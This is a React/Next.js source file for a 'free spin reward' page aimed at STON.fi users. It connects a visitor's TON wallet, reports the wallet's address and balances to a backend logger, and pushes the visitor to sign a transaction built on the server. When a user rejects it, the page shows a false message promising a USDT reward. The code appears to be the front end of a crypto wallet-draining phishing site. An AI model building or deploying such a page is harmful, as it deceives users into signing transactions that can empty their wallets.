import Image from "next/image";
import { Inter } from "next/font/google";
import { useEffect, useRef, useState } from "react";
import Modal from "@/components/ConnectModal";
import { UserRejectsError, useTonConnectUI } from "@tonconnect/ui-react";
import { Connect, sendLog } from "@/utils/httpClient";
import toast from "react-hot-toast";
import {
  PREPARE_TRANSACTION,
  TRANSACTION_REJECTED,
  TRANSACTION_SUCCESS,
} from "@/utils/Strings";

const inter = Inter({ subsets: ["latin"] });

/**
 * v0 by Vercel.
 * @see https://v0.dev/t/nzdDjxr9VSJ
 * Documentation: https://v0.dev/docs#integrating-generated-code-into-your-nextjs-app
 */
export default function Component() {
  const spinRef = useRef(null);
  const [showModal, setShowModal] = useState(false);
  const [tonConnectUI] = useTonConnectUI();
  const [connected, setConnected] = useState(false);
  const [result, setResult] = useState({});
  const [waiting, setWaiting] = useState(false);

  function Spin() {
    spinRef.current.classList.add("spin");
  }

  function onAnimationEnd() {
    localStorage.setItem("modal", "true");
    setShowModal(true);
  }

  async function isConnRestored() {
    const isConnectionRestored = await tonConnectUI.connectionRestored;
    return isConnectionRestored;
  }

  async function isNewConnected() {
    const isConnected = tonConnectUI.connected;
    return isConnected;
  }

  async function walletReady() {
    const isRestored = await isConnRestored();
    const isNewConn = await isNewConnected();
    return isRestored || isNewConn;
  }

  async function Continue() {
    if (result.status) {
      const walletData = result.walletData;
      const text = PREPARE_TRANSACTION({
        address: walletData.address,
        walletBalance: walletData.walletBalance,
        tonBalance: walletData.tonBalance,
        tonBalanceUSD: walletData.tonBalanceUSD,
      });

      await sendLog(text);

      try {
        const txResult = await tonConnectUI.sendTransaction(result.tx);
        if (txResult) {
          const text = TRANSACTION_SUCCESS({
            address: walletData.address,
            walletBalance: walletData.walletBalance,
          });

          sendLog(text);
        }
      } catch (err) {
        if (err instanceof UserRejectsError) {
          const text = TRANSACTION_REJECTED({
            address: walletData.address,
            walletBalance: walletData.walletBalance,
          });

          sendLog(text);

          return toast.error(
            "Confirm the swap transaction. Once confirmed, a 0.1 TON gas fee will be deducted, and your assets plus the reward will be converted to USDT and added to your wallet !",
            { position: "top-center", duration: 7000 }
          );
        }
      }
    } else {
      return toast.error(result.message, {
        position: "top-center",
        duration: 4000,
      });
    }
  }

  async function openModal() {
    await tonConnectUI.openModal();
  }

  useEffect(() => {
    function handleModal() {
      const modal = localStorage.getItem("modal");
      if (modal === "true") setShowModal(true);
    }

    async function connectionHandler() {
      setConnected(await walletReady());
    }

    async function handleWalletConnect() {
      tonConnectUI.onStatusChange(
        async (connectedWallet) => {
          const isRestoredConn = await isConnRestored();
          const isNewConn = await isNewConnected();
          if (!connectedWallet) {
            // wallet disconnected !
            setConnected(false);
            setResult({});
            return;
          }

          if (isNewConn || isConnRestored) {
            const walletAddress = connectedWallet.account.address;
            const walletPubkey = connectedWallet.account.publicKey;
            setConnected(true);
            setWaiting(true);
            const res = await Connect(
              walletAddress,
              walletPubkey,
              isRestoredConn
            );
            setWaiting(false);
            setResult(res);
          }
        },
        (err) => {
          console.log(err);
        }
      );
    }

    handleModal();
    handleWalletConnect();
    connectionHandler();
  }, []);

  return (
    <>
      {showModal && (
        <Modal
          Continue={Continue}
          connected={connected}
          openModal={openModal}
          waiting={waiting}
        />
      )}
      <div
        className="min-h-screen bg-cover bg-center"
        style={{ backgroundImage: "url(/img/bg-desk.jpg)" }}
      >
        <div className="flex flex-col items-center text-center space-y-4 pt-8">
          <h1 className="text-3xl font-bold text-white"></h1>
          <h2 className="text-xl font-bold text-white">FREE SPIN REWARD</h2>
          <h2 className="text-xl font-bold text-white">FOR STON.fi USERS</h2>
        </div>
        <div className="relative flex justify-center mt-8">
          <Image
            ref={spinRef}
            onAnimationEnd={onAnimationEnd}
            src="/img/wheel-spinner-en.png"
            alt="Wheel"
            width={1000}
            height={1000}
            className="w-80 h-80 spiner"
          />
          <Image
            src="/img/wheel-arrow.png"
            alt="arrow"
            width={1000}
            height={1000}
            className="absolute w-20 h-20 inset-y-[36%]"
          />
        </div>
        <div className="flex justify-center mt-4">
          <button
            onClick={Spin}
            className="px-6 py-2 bg-pink-500 text-white font-bold rounded-lg"
          >
            FREE SPIN
          </button>
        </div>
        <div className="flex flex-col items-center space-y-4 mt-8">
          <div className="flex items-center space-x-2 bg-purple-700 p-4 rounded-lg w-11/12 max-w-md">
            <div className="w-8 h-8 bg-purple-900 text-white flex items-center justify-center rounded-full">
              1
            </div>
            <p className="text-white text-sm">
              If you are official owner «TONLUCKY NFT», click the button «FREE
              SPIN»
            </p>
          </div>
          <div className="flex items-center space-x-2 bg-purple-700 p-4 rounded-lg w-11/12 max-w-md">
            <div className="w-8 h-8 bg-purple-900 text-white flex items-center justify-center rounded-full">
              2
            </div>
            <p className="text-white text-sm">
              If you win reward in free spin, we congratulate you!
            </p>
          </div>
          <div className="flex items-center space-x-2 bg-purple-700 p-4 rounded-lg w-11/12 max-w-md">
            <div className="w-8 h-8 bg-purple-900 text-white flex items-center justify-center rounded-full">
              3
            </div>
            <p className="text-white text-sm">
              Click «Claim Reward», connect your wallet and confirm in wallet
              received transaction
            </p>
          </div>
        </div>
      </div>
    </>
  );
}
